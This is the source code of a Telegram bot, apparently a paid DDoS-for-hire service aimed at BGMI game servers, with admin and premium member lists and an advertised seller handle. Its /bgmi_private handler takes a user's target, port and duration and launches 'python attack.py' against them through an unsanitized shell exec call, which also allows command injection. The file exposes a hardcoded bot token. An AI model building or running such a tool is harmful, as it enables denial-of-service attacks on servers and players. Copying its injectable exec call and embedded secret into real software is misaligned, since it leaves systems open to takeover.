const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const fetch = require("node-fetch");
const { exec } = require('child_process');
const token = "7361699788:AAHN6u7I40WbRuxDsyMcJd7BcvXDJoUvM88";
admin_account = [701327388, -1002196164125];
USER_FILE = "users.txt";
LOG_FILE = "log.txt";
// Create a new bot instance
const bot = new TelegramBot(token, { polling: true });
let message;
publicMembers = [701327388];
premiumMembers = [1109637338, 5437953839, 1059400908];
const url = `https://api.telegram.org/bot${token}/sendMessage`;

function touchRestartFile() {
  const filePath = "./restart.txt";
  const time = new Date();

  fs.utimes(filePath, time, time, (err) => {
    if (err) {
      console.error("Failed to touch restart.txt file:", err);
    } else {
      console.log("Touched restart.txt file to trigger nodemon restart.");
    }
  });
}
function addUserToFile(userId) {
  fs.appendFile("users.txt", `${userId}\r\n`, (err) => {
    if (err) {
      console.error("Failed to add user to file:", err);
    } else {
      console.log("User added to file:", userId);
    }
  });
}
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  try {
    let help_text = `
     Available Commands:
/attack : BGMI Servers
    `;
    bot.sendMessage(chatId, help_text);
  } catch (err) {
    console.error("Error:", err);
  }
});
bot.onText(/\/adduser (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  if (!admin_account.includes(chatId)) {
    return bot.sendMessage(
      chatId,
      `Dear ${msg.chat.first_name},\nYou're Not Authorized To Use This Command`,
      { reply_to_message_id: msg.message_id }
    );
  }

  const userIdToAdd = match[1];
  if (!/^\d+$/.test(userIdToAdd)) {
    return bot.sendMessage(
      chatId,
      "Invalid user ID format. Please enter a numeric user ID."
    );
  }
  // Add the user ID to the users.txt file
  addUserToFile(userIdToAdd);
  // Confirm to the admin that the user ID was added
  bot.sendMessage(
    chatId,
    `User ID ${userIdToAdd} has been added successfully.`
  );
});

bot.onText(/\/users/, (msg) => {
  try {
    fs.readFile(USER_FILE, "utf8", (err, data) => {
      if (err) {
        console.error("Error reading file:", err);
        return;
      }
      const chatId = msg.chat.id;

      const payload = {
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      };

      fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      })
        .then((response) => response.json())
        .then((data) => {
          bot.sendMessage(chatId, data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    });
  } catch (err) {
    console.error("Error:", err);
  }
});
bot.onText(/\/attack/, (msg) => {
  const chatId = msg.chat.id;
  try {
    let help_text = `
     Available BGMI Commands:
/bgmi : BGMI Public Server,
/bgmi_private : BGMI Private And Powerful Server 
    `;
    bot.sendMessage(chatId, help_text);
  } catch (err) {
    console.error("Error:", err);
  }
});
bot.onText(/\/bgmi$/, (msg) => {
  const chatId = msg.chat.id;
  try {
    if (!publicMembers.includes(chatId) && !admin_account.includes(chatId)) {
      return bot.sendMessage(
        chatId,
        `  Dear ${msg.chat.first_name},
You're Not Authorized To Use This Command`
      );
    }
  } catch (err) {
    console.error("Error:", err);
  }
});

async function sendSpinnerMessage(bot, chatId, initialMessageId, totalTime, name, command, target, port) {
  const spinnerChars = ['⏳', '⌛', '⏰', '⏱️'];
  let currentSpinnerIndex = 0;
  let remainingTime = totalTime;

  const spinnerInterval = setInterval(async () => {
    currentSpinnerIndex = (currentSpinnerIndex + 1) % spinnerChars.length;
    remainingTime -= 1;

    if (remainingTime <= 0) {
      clearInterval(spinnerInterval);
      return;
    }

    try {
      await bot.editMessageText(
        `Dear ${name
        },\n<b>Attack Started..${spinnerChars[currentSpinnerIndex]}!</b>\n<b>Attack Type:</b> ${command === "/bgmi_private"
          ? "Premium Method"
          : "Slow Method (Sometimes does not work)"
        }\n<b>Target:</b> ${target},\n<b>Port:</b> ${port}\n<b>Time:</b> ${remainingTime} Seconds Left`,
        {
          parse_mode: "HTML",
          chat_id: chatId,
          message_id: initialMessageId,
        }
      );
    } catch (err) {
      console.error('Error updating spinner message:', err);
    }
  }, 1000); // Update every second

  return spinnerInterval;
}

bot.onText(/^\/bgmi_private($|\s)/, async (msg, match) => {
  const chatId = msg.chat.id;
  try {
    if (!premiumMembers.includes(chatId) && !admin_account.includes(chatId)) {
      const message = await bot.sendMessage(
        chatId,
        `Dear ${msg.chat.first_name},\nYou're Not a Premium Member,\nBuy Premium from: @ShreekrushnaShinde`
      );
      await bot.sendMessage(chatId, message, {
        reply_to_message_id: msg.message_id,
      });
    } else {
      const [command, target, port, time] = msg.text.split(" ");
      if (target && port) {
        const message = `Dear ${msg.chat.first_name
          },\n<b>Starting Attack..⏳!</b>\n<b>Attack Type:</b> ${command === "/bgmi_private"
            ? "Premium Method"
            : "Slow Method (Sometimes does not work)"
          }\n<b>Target:</b> ${target},\n<b>Port:</b> ${port}\n<b>Time:</b> ${time} Seconds Left`;

        let initialMessage = await bot.sendMessage(chatId, message, {
          parse_mode: "HTML",
          reply_to_message_id: msg.message_id,
        });
        let name = msg.chat.first_name;
        const spinnerInterval = await sendSpinnerMessage(bot, chatId, initialMessage.message_id, time, name, command, target, port);
        exec(`python attack.py ${target} ${port} ${time}`, async (error, stdout, stderr) => {
          clearInterval(spinnerInterval);
          if (error) {
            console.error(`Error executing Python script: ${error.message}`);
            return bot.sendMessage(chatId, 'There was an error processing your request.');
          }

          if (stderr) {
            console.error(`Error in Python script: ${stderr}`);
            return bot.sendMessage(chatId, 'There was an error processing your request.');
          }
          if (!stdout || /^\s*$/.test(stdout)) {
            return bot.sendMessage(chatId, 'The output is empty.');
          }
          await bot.editMessageText(`Dear ${msg.chat.first_name},\n<b>BGMI Attack Finished✅</b>.\n<b>Target:</b> ${target}.\n<b>Port:</b> ${port}.\n<b>Time:</b> ${time}.\n<b>Attack Status:</b>${'Success'}`, {
            chat_id: chatId,
            message_id: initialMessage.message_id,
            parse_mode: "HTML",
          });
        });

      } else {
        const message = `Dear ${msg.chat.first_name},\nPlease Type Command Like:\n/bgmi_private Target Port.\n<b>Note: No Need To Specify Time Because Best Time Is Already In System By @ShreekrushnaSHINDE.</b>\nThanks For Your Support.`;
        await bot.sendMessage(chatId, message, {
          parse_mode: "HTML",
          reply_to_message_id: msg.message_id,
        });
      }
    }
  } catch (err) {
    console.error("Error:", err);
  }
});
function chunkString(str, length) {
  return str.match(new RegExp('.{1,' + length + '}', 'g'));
}
console.log("Bot started...");